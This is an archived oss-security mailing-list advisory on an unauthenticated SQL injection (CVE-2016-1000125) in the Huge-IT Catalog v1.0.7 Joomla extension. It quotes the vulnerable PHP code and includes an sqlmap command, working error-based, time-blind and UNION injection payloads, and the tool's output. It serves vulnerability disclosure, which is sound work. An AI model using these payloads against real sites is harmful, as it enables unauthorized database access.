X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3609" "Friday" "23" "September" "2016" "03:55:03" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<2CFDA631-3BD1-43C1-A7EC-100AB9EFEB11@me.com>" "76" "[oss-security] Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla" nil nil nil "9" "2016092307:55:03" "[oss-security] Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla" (number mark "U       larry0@me.co Sep 23   76/3609  " thread-indent "\"[oss-security] Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10048 invoked by uid 550); 23 Sep 2016 07:55:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 10009 invoked from network); 23 Sep 2016 07:55:17 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1474617306; bh=gtwcZLM2YMpzNogu9XLpCA+1J9X8ho1WjeDeH/A9AyM=;
	h=Subject:From:Content-type:Message-id:Date:To:MIME-version;
	b=lKQ2AS36TtGQ/W6bWl5WOSORwIPKPjzNg/ZxbJjPdKz7HDfXeCyJPFArnjp/X6TCT
 E07BBGaMq/t+2DBN0+/TV465zJ6ioPrkVmT1oXgiYGVFPz0fJU0GtCZK/iD2s/vqbM
 juTYQaM93TOa9v265JHf8BMeLOsLpCsp7MPeTojKjJ0kX3SHUga+rAKDBm1J4oOdaq
 VCmHi9VqK3U21pN3FUniV+WML5SiY48UoASYph7D8RyVYzCZxdlk8ybqpeWrjZpmA5
 RIezHK0Gq5pHljzUFScRNOwqNWVHiNbccoIqVWPBWhLvLI17CBfoeVOMUk6XVVB/A3
 U7ZfH9ZYdBPWA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-09-23_04:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1609230144
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: multipart/alternative;
 boundary=Apple-Mail-7F8A1D13-1803-46A6-852C-E5F918CA7B20
X-Mailer: iPad Mail (13G36)
Message-id: <2CFDA631-3BD1-43C1-A7EC-100AB9EFEB11@me.com>
Date: Fri, 23 Sep 2016 03:55:03 -0400
To: oss-security@lists.openwall.com
Content-transfer-encoding: 7bit
MIME-version: 1.0 (1.0)
Subject: [oss-security] Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla

--Apple-Mail-7F8A1D13-1803-46A6-852C-E5F918CA7B20
Content-Type: text/plain;
	charset=us-ascii
Content-Transfer-Encoding: quoted-printable


Title: Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla
Author: Larry W. Cashdollar, @_larry0
Date: 2016-09-16
Download Site: http://huge-it.com/joomla-catalog/
Vendor: huge-it.com
Vendor Notified: 2016-09-17
Vendor Contact: info@huge-it.com
Description: Huge-IT Product Catalog is made for demonstration, sale, adver=
tisements for your products. Imagine a stand with a variety of catalogs wit=
h a specific product category. To imagine is not difficult, to use is even =
easier.
Vulnerability:
The following code does not prevent an unauthenticated user from injecting =
SQL into functions via 'load_more_elements_into_catalog' located in ajax_ur=
l.php. Vulnerable Code in : ajax_url.php 11 define('_JEXEC', 1); 12 defined=
('_JEXEC') or die('Restircted access'); . . . 308 } elseif ($_POST["post"] =
=3D=3D "load_more_elements_into_catalog") { 309 $catalog_id =3D $_POST["cat=
alog_id"]; 310 $old_count =3D $_POST["old_count"]; 311 $count_into_page =3D=
 $_POST["count_into_page"]; 312 $show_thumbs =3D $_POST["show_thumbs"]; 313=
 $show_description =3D $_POST["show_description"]; 314 $show_linkbutton =3D=
 $_POST["show_linkbutton"]; 315 $parmalink =3D $_POST["parmalink"]; 316 $le=
vel =3D $_POST['level']; . . . 359 $query->select('*'); 360 $query->from('#=
__huge_it_catalog_products'); 361 $query->where('catalog_id =3D' . $catalog=
_id); 362 $query->order('ordering asc'); 363 $db->setQuery($query, $from, $=
count_into_page);
CVE-2016-1000125

Exploit Code:
$ sqlmap -u 'http://example.com/components/com_catalog/ajax_url.php' --data=
=3D"prod_page=3D1&post=3Dload_more_elements_into_catalog&catalog_id=3D*&old=
_count=3D*&count_into_page=3D*&show_thumbs=3D*&show_description=3D*&parmali=
nk=3D*" --level=3D5 --risk=3D3
=20
Parameter: #1* ((custom) POST)
 Type: error-based
 Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
 Payload: prod_page=3D1&post=3Dload_more_elements_into_catalog&catalog_id=
=3D-2369 OR 1 GROUP BY CONCAT(0x717a627871,(SELECT (CASE WHEN (1973=3D1973)=
 THEN 1 ELSE 0 END)),0x716b787671,FLOOR(RAND(0)*2)) HAVING MIN(0)#&old_coun=
t=3D&count_into_page=3D&show_thumbs=3D&show_description=3D&parmalink=3D
=20
 Type: AND/OR time-based blind
 Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
 Payload: prod_page=3D1&post=3Dload_more_elements_into_catalog&catalog_id=
=3D(CASE WHEN (7371=3D7371) THEN SLEEP(5) ELSE 7371 END)&old_count=3D&count=
_into_page=3D&show_thumbs=3D&show_description=3D&parmalink=3D
=20
 Type: UNION query
 Title: Generic UNION query (random number) - 15 columns
 Payload: prod_page=3D1&post=3Dload_more_elements_into_catalog&catalog_id=
=3D-5943 UNION ALL SELECT 2434,2434,2434,2434,2434,2434,2434,2434,2434,2434=
,2434,2434,2434,2434,CONCAT(0x717a627871,0x494a475477424c724f6f7853556d6159=
7544576f4b614d6e41596771595253476c4251797a685974,0x716b787671)-- FvOy&old_c=
ount=3D&count_into_page=3D&show_thumbs=3D&show_description=3D&parmalink=3D
---
[16:48:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >=3D 5.0.12
[16:48:10] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 6637 times
[16:48:10] [INFO] fetched data logged to text files under '/home/larry/.sql=
map/output/example.com'
=20
[*] shutting down at 16:48:10
=20

Advisory: http://www.vapidlabs.com/advisory.php?v=3D171=

--Apple-Mail-7F8A1D13-1803-46A6-852C-E5F918CA7B20--
